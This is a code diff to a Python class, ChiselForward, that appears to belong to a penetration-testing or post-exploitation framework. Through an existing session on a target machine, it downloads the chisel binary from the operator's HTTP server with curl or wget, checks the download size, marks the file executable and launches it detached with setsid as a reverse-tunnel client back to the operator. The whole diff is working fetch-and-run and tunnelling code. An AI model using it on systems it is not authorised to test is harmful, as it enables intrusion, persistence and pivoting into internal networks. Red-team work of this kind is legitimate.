@@ -113,16 +113,34 @@ class ChiselForward:
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
         time.sleep(1.0)  # let the server bind
 
-        # 3. on the target: pull chisel, then run the reverse client, backgrounded
+        # 3. on the target: note arch, pull chisel, verify it landed, run the client
+        arch = ""
+        try:
+            arch = self.session.exec("uname -m", timeout=10).out.strip()
+        except Exception:
+            pass
         url = f"http://{self.lhost}:{self._http_port}/{chisel_name}"
         self.session.exec(
-            f"command -v wget >/dev/null 2>&1 && wget -q {url} -O {self._remote_bin} "
-            f"|| curl -s {url} -o {self._remote_bin}", timeout=timeout)
+            f"rm -f {self._remote_bin}; "
+            f"(command -v curl >/dev/null 2>&1 && curl -s -m 20 {url} -o {self._remote_bin}) "
+            f"|| (command -v wget >/dev/null 2>&1 && wget -q -T 20 {url} -O {self._remote_bin})",
+            timeout=timeout)
+        try:
+            got = int((self.session.exec(
+                f"wc -c < {self._remote_bin} 2>/dev/null || echo 0", timeout=10).out.split() or ["0"])[0])
+        except Exception:
+            got = 0
+        if got < 1000:                          # chisel is multi-MB; ~0 means the fetch failed
+            self.stop()
+            raise RuntimeError(
+                f"chisel did not download to the target (got {got} bytes) — is wget/curl on the "
+                f"box, and can it reach {url}? (target arch={arch or '?'})")
         self.session.exec(f"chmod +x {self._remote_bin}", timeout=10)
         client = (f"{self._remote_bin} client {self.lhost}:{self._server_port} "
                   f"R:127.0.0.1:{self.local_port}:{self.remote_host}:{self.remote_port}")
-        self.session.exec(f"setsid {client} >/dev/null 2>&1 & "
-                          f"nohup {client} >/dev/null 2>&1 &", timeout=10)
+        # Subshell so the backgrounding stays valid syntax after exec() appends its
+        # sentinel (a bare trailing '&' would become '&; printf ...' = syntax error).
+        self.session.exec(f"( setsid {client} >/dev/null 2>&1 & )", timeout=10)
 
         # 4. wait for the tunnel to come up (operator-side local port accepts)
         deadline = time.monotonic() + timeout
@@ -132,8 +150,10 @@ class ChiselForward:
             time.sleep(0.5)
         self.stop()
         raise RuntimeError(
-            f"chisel tunnel did not come up on 127.0.0.1:{self.local_port} within {timeout}s "
-            f"— check chisel is on the target, that it can reach {self.lhost}, and the arch matches")
+            f"chisel tunnel did not come up on 127.0.0.1:{self.local_port} within {timeout}s. "
+            f"chisel downloaded fine ({got} bytes), so check: target arch is {arch or '?'} "
+            f"(the shipped binary is amd64 — a non-x86_64 target needs a matching chisel), and "
+            f"the target can reach {self.lhost}:{self._server_port} outbound.")
 
     def is_alive(self) -> bool:
         return (any(p.poll() is None for p in self._procs)
